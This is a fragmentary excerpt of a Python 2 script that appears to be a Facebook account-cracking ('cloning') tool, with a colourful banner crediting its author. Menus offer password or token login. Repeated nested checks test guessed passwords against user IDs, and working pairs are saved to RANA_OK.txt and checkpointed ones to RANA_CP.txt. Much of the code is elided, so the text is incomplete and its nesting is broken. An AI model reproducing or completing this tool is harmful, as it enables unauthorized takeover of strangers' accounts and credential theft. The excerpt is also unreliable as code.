...
logo = """
\033[1;96m--------------------------------------------------
\033[1;92m(!)\033[1;92m Author   : Hamayun Khan
\033[1;92m(!)\033[1;92m Fb       : Hamayun Khan
\033[1;92m(!)\033[1;92m ENJOY FREE CLONING
\033[1;96m--------------------------------------------------
"""
...
def log_menu_s():
    s = raw_input(' \x1b[1;94m\xe2\x95\xb0\xe2\x94\x80HAMAYUN\xe2\x9e\xa4 ')
    if s == '1':
        log_fb()
    elif s == '2':
        log_token()
...
def menu():
    ...
    print '\x1b[1;94m[2] Extract File'
    print '\x1b[1;94m[3] Logout'
    print '\x1b[1;94m[4] Delete trash files'
    menu_s()
                ...
                if 'loc' in q:
                    ...
                    if 'loc' in q:
                        ...
                        if 'loc' in q:
                            ...
                            print '\x1b[1;31;1m[RANA-CP] ' + uid + ' | ' + pass4
                            cp = open('RANA_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            if 'loc' in q:
                                ...
                                if 'loc' in q:
                                    ...
                                    if 'loc' in q:
                                        ...
                                        q = json.loads(data)
                                        if 'loc' in q:
                                            print '\x1b[1;92m[RANA-OK] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                            ok = open('/sdcard/ids/RANA_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
